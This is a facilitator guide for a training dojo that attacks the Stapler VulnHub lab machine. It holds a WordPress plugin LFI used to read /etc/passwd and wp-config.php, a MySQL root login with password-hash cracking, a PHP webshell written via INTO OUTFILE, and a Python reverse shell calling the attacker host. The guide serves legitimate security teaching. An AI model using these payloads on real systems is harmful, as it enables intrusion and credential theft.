---
author: bhero
topic: dojo
---

Facilitator guide

# Part 1 - 30 - 45 min

Objective: Help everyone get set up

## Tasks
1. Explain the dojo
2. Explain the network - draw diagram
3. Assist in setup

No cheat sheets here, all the notes are in the exercise file


# Part 2 - 30 - 45 min

Objective: Get everyone to be able to scan the target

## Tasks
1. Explain the process as an overview - draw diagram 
2. Intorduce the recon/scanning concept
3. Introduce nmap and let attendees follow the guide
4. force a recap after 30/45 min

# Part 3 - 60 min

Objective: Complete analysis

1. Introduce reverse shells - draw diagram
2. demo hydra syntax after 30 min
3. encourage googling
4. answer questions on the services
5. demo manual interactions as required

# Part 4 - 30 min

Objective: get remote code execution

## Tasks

1. Pull everyone in to get them to the same stage
2. Demo a vector from the walkthrough

key notes before attack - the plugin is vulnerable to LFI
This allows access to root dB creds, with this we can get full shell access.

This section varies with skill of audience, many folks may just want a demo others hints.
Preferred vector is progromatic exploit as audience are devs

can also steal/guess username and break password - cover how to do this via hydra tutorial

explain there is way in with a code vulnerability, show exploit dB and searchsploit and rev shells

Attack the webserver via wordpress upload.
get the nikto scan: (set the var STAPLER_IP)

```
nikto -h https://$STAPLER_IP:12380/blogblog/ > HTTPSblogblog.txt
```

start scripts to identify the wp_users and the plugins:

```
wpscan --url https://$STAPLER_IP:12380/blogblog/ --enumerate u --disable-tls-checks -o wpscan_users.txt
```

```
wpscan --url https://$STAPLER_IP:12380/blogblog/ --enumerate ap --disable-tls-checks --plugins-detection aggressive -o wpscan_plugins.txt
```

while running show the dir listing issue and visit the plugins url: 
https://192.168.56.104:12380/blogblog/wp-content/plugins/

poke about - highlight the uploads:
https://192.168.56.104:12380/blogblog/wp-content/uploads/

mention plugins are usually the weakness

use searchsploit:

```
searchsploit wordpress plugin video advanced
```

read in terminal

```
less /usr/share/exploitdb/exploits/php/webapps/39646.py 
```

explain that it forces an upload of an 'image' because $thumb not secure, no file type check implemented. - check the inputs would fix this.

a POC:
https://192.168.56.104:12380/blogblog/wp-admin/admin-ajax.php?action=ave_publishPost&title=random&short=1&term=1&thumb=/etc/passwd`

go to uploads and view the picture
explain it is text not jpg, so we curl

example:

```
curl -k https://$STAPLER_IP:12380/blogblog/wp-content/uploads/108293608.jpeg
```

now we check the wp-config because it has dB access details:
https://192.168.56.104:12380/blogblog/wp-admin/admin-ajax.php?action=ave_publishPost&title=random&short=1&term=1&thumb=../wp-config.php


get mysql root password onliner example:

curl -k https://$STAPLER_IP:12380/blogblog/wp-content/uploads/1006632345.jpeg

login and get passwords

```
mysql -h $STAPLER_IP -u root -pplbkac 
use wordpress;
select user_login,user_pass from wp_users;
```

close the connection and get the editied file: [wp_users.txt](/assets/vulnhub_stuff/stapler/wp_users.txt)

break the passwords with:

john wp_users.txt -wordlist=/usr/share/wordlists/rockyou.txt
this would let you login, but we all use super big passwords right?

so we won't wait, lets revisit the exploit to get the server root of the webserver via default config, explain apache config

https://192.168.56.104:12380/blogblog/wp-admin/admin-ajax.php?action=ave_publishPost&title=random&short=1&term=1&thumb=/etc/apache2/sites-enabled/000-default.conf

curl it to see DocumentRoot /var/www/https can be enumerated from /etc/apache2/sites-enabled/000-default.conf

login again and pop a wbshell in

```
mysql -h $STAPLER_IP -u root -pplbkac 
select "<?php echo shell_exec($_GET['cmd']);?>" into outfile '/var/www/https/blogblog/wp-content/uploads/mysql-shell.php';
```

check it works example:

https://192.168.56.105:12380/blogblog/wp-content/uploads/mysql-shell.php?cmd=ls


time to get a shell:
set listner on port 21 
then go here:
https://192.168.56.104:12380/blogblog/wp-content/uploads/system-webshell.php?cmd=python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.56.1",21));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

do stuff, show execution!

spawn bash:
``` sh
python -c 'import pty; pty.spawn("/bin/bash")'
```

do stuff, show execution!

ctrl^Z it and get a ptty:
```
stty raw -echo
fg
```

do stuff, show execution!


> This is the biggest section of the dojo. Recap here

# Part 5 60 min

Objective: get root

## Tasks

1. Demo all the ways that were not picked up in order to get root - show the walkthrough
2. wrap up
3. feedback

## Recommended Resources

tutorial site for each manual step

next up [Attacking](Stapler-Dojo-Part-4.html)